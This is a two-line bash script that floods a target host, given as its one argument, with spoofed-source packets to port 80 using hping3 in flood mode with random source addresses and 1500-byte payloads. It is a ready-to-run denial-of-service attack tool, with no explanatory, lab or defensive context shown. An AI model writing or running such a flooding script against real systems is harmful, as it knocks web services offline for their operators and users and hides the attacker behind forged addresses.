#!/bin/bash
sudo hping3 --flood --rand-source -p 80 -d 1500 $1
